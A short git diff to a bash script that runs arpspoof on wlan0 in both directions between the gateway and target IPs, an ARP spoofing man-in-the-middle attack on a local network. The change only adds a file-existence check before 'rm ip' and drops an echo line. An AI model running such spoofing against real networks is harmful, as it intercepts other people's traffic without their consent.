@@ -1,6 +1,8 @@
 #!/bin/bash
 
-sudo rm ip
+if [ -f `pwd`/ip ]; then
+	sudo rm ip
+fi
 
 #sudo killall arpspoof
 #sudo bash -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'
@@ -43,5 +45,4 @@ for i in `seq 1 10`; do
 		sudo arpspoof -i wlan0 -t $gateway $ip  & >/dev/null
 		sudo arpspoof -i wlan0 -t $ip $gateway  & >/dev/null
 	fi
-	echo $ip"-"$fl
 done
